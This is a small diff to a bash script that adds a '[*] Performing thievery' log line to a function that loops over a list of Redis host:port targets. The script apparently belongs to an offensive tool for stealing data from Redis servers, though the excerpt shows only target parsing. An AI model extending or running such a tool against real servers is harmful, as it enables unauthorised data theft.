@@ -65,6 +65,7 @@ function prep_output_directory() {
 }
 
 function perform_theivery() {
+    out "[*] Performing thievery" >&2;
     for target in $(echo -n "$REDIS_TARGETS" | sed 's/,/ /g'); do 
         host="$(echo -n $target | cut -d ':' -f1)";
         port="$(echo -n $target | cut -d ':' -f2)";
